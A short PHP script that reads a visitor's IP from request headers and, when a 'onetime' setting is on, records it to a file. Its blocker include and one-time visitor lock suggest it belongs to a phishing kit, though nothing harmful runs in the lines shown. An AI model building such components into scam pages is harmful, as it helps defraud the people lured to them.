<?php
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../lang.php');
require_once('../session.php');
require_once('../additional.php');
require_once("files/done.php");
function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$ip = getUserIPs();
if($config['onetime'] == "YES") {
	tulis_file("../security/onetime.dat","$ip");
}